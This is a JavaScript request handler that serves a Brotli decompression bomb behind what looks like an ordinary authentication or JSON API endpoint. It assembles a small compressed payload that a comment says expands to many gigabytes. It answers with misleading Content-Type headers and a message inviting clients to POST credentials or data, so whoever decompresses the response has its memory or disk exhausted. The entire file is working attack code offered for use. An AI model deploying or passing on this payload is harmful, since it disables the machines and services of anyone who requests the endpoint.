const brotliBombBase64Parts = {
    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//",
    Seq128MB:
        "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/z///f/gnAOKwAED3/p/////wTwDEYQGA7v0/////4Z8AiMMCAN37f/7//8M/ARCHBQC69//8//",
    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw==",
};

function fixBase64Padding(base64) {
    base64 = base64.replace(/=+$/, "");
    const padding = base64.length % 4;
    if (padding > 0) {
        base64 += "=".repeat(4 - padding);
    }
    return base64;
}

function makeBrotliBombBase64(count) {
    // 79*Seq128MB = 10GB
    var out = "";
    out += brotliBombBase64Parts.Header;
    for (var i = 0; i < count; i++) {
        out += brotliBombBase64Parts.Seq128MB;
    }
    out += brotliBombBase64Parts.Footer;
    out = fixBase64Padding(out);
    return out;
}

function base64ToArrayBuffer(base64) {
    const binaryStr = atob(base64);
    const len = binaryStr.length;
    const buffer = new ArrayBuffer(len);
    const view = new Uint8Array(buffer);

    for (let i = 0; i < len; i++) {
        view[i] = binaryStr.charCodeAt(i);
    }
    return buffer;
}

export default async function handleRequest(request) {
    const url = new URL(request.url);
    const params = url.searchParams;

    const DEFAULT_COUNT = 2047;
    const debug = params.get("debug") === "true";
    const count = parseInt(params.get("count")) || DEFAULT_COUNT;

    if (request.method !== "POST" && !debug) {
        return new Response(
            JSON.stringify({
                error: "Method Not Allowed",
                message: "Please use POST to authenticate or retrieve data.",
            }),
            {
                status: 405,
                headers: {
                    "Content-Type": "application/json",
                    Allow: "POST",
                },
            },
        );
    }

    const acceptEncoding = request.headers.get("Accept-Encoding");

    if (
        !acceptEncoding ||
        (!acceptEncoding.includes("br") && !acceptEncoding.includes("*"))
    ) {
        return new Response("Require Accept-Encoding: br", { status: 406 });
    }

    const brotliBomb = base64ToArrayBuffer(makeBrotliBombBase64(count));

    return new Response(brotliBomb, {
        encodeBody: "manual",
        headers: {
            "Content-Encoding": "br",
            "Content-Length": brotliBomb.byteLength.toString(),
            "Content-Type": debug
                ? "text/html; charset=utf-8"
                : "application/json",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
        },
    });
}
